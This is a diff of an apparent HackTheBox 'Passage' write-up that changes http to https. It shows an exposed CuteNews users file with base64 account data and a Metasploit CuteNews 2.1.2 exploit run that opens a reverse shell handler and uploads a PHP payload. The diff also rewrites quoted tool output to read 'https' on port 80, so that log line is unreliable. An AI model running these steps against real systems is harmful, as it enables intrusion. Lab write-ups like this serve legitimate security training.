@@ -32,15 +32,15 @@ tcp        0      0 ip-172-31-64-16.e:47580 ec2-34-244-158-23:https ESTABLISHE
 
 ```bash
 # go to the website
-http://passage.htb/
+https://passage.htb/
 
 # power by cute new
-http://passage.htb/CuteNews/
+https://passage.htb/CuteNews/
 
 # register
 
 # find the file
-http://passage.htb//CuteNews/cdata/users/lines
+https://passage.htb//CuteNews/cdata/users/lines
 # YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTY6InBhdWxAcGFzc2FnZS5odGIiO3M6MTA6InBhdWwtY29sZXMiO319
 # YToxOntzOjI6ImlkIjthOjE6e2k6MTU5ODgyOTgzMztzOjY6ImVncmU1NSI7fX0=
 # YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTU6ImVncmU1NUB0ZXN0LmNvbSI7czo2OiJlZ3JlNTUiO319
@@ -213,7 +213,7 @@ msf5 exploit(php/webapps/46698) > set rhosts passage.htb
 
 msf5 exploit(php/webapps/46698) > run
 [*] Started reverse TCP handler on 10.10.15.74:4444
-[*] http://10.10.10.206:80 - CuteNews is 2.1.2
+[*] https://10.10.10.206:80 - CuteNews is 2.1.2
 [+] Authentication was successful with user: paul-coles
 [*] Trying to upload yljlkhau.php
 [+] Upload successfully.
